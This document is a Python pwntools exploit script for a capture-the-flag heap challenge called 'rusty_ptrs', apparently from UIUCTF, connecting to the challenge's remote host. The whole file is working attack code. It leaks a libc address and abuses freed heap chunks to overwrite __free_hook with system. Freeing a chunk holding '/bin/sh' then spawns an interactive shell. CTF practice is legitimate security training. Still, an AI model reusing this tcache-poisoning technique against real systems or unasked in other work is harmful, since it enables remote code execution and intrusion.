from pwn import *
import sys

RULE = 1
NOTE = 2
CRE = 1
DEL = 2
VIEW = 3
EDIT = 4

_path = "./rusty_ptrs_patched"
exe = ELF(_path)
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
add = 'rustyptrs.chal.uiuc.tf'
port = 1337
cmd = '''
    continue
'''

_option = {'run' : process(_path), 
           'exp' : remote(add, port, ssl = True)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    else:
        return _option[sys.argv[1]]

chall = conn()
context.log_level = 'debug'

def p(_data):
    return p64(_data, endian = 'little')

#option
def _op(num):
    chall.sendlineafter(b'>', str(num).encode())

def leak():
    _op(5)
    chall.recvuntil(b'0x')
    return int(chall.recv(12).decode(), 16)

def _cre(_tp):
    _op(CRE)
    _op(_tp)

def _del(_tp, idx):
    _op(DEL)
    _op(_tp)
    _op(idx)

def _view(_tp, idx):
    _op(VIEW)
    _op(_tp)
    _op(idx)

def _edit(_tp, idx, content):
    _op(EDIT)
    _op(_tp)
    _op(idx)
    chall.sendlineafter(b'> ', content)

def _take_it(idx):
    _view(RULE, idx)
    chall.recvuntil(b'0x')
    chall.recvuntil(b'0x')
    return int(chall.recv(12).decode(), 16)

def _check():
    chall.interactive()
    exit()

def main():
    libc.address = leak() - 0x1ecbe0
    #fill note[0] and rule[0]
    _cre(RULE)
    _cre(NOTE)
    #Create enough double_freed chunk for use
    for i in range(5):
        _cre(RULE)
        _cre(NOTE)
    for i in range(4, 0, -1):
        _del(NOTE, i)
    
    _pad = _take_it(1)

    #Overwrite freed_chunk->fd with __free_hook address
    payload = p(libc.sym['__free_hook']) + p(_pad)
    _edit(RULE, 1, payload)

    print(hex(libc.address))
    print(hex(libc.sym['__free_hook']))
    #Allocate current freed_chunk so the next time allocate a chunk, it will point to __free_hook
    _cre(NOTE)

    #The chunk create below will point to __free_hook
    _cre(NOTE)
    #Replace with system
    _edit(NOTE, 3, p(libc.sym['system']))
    #Modify a created note so it would have "/bin/sh" string
    _edit(NOTE, 0, b'/bin/sh')
    #Free it and get the shell
    _del(NOTE, 0)
    chall.interactive()


if __name__ == "__main__":
    main()
